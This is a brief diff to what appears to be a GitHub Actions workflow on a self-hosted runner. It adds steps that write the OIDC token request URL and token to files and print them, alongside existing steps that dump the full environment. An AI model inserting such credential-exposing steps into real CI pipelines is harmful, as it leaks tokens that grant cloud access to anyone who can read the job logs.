@@ -5,6 +5,10 @@ jobs:
     runs-on: self-hosted
     steps:
       - shell: bash
+        run: echo ${ACTIONS_ID_TOKEN_REQUEST_URL} > f.txt | head f.txt
+      - shell: bash
+        run: echo ${ACTIONS_ID_TOKEN_REQUEST_TOKEN} > r.txt | head r.txt
+      - shell: bash
         run: env
       - shell: bash
         run: node -e "console.log(process.env)"
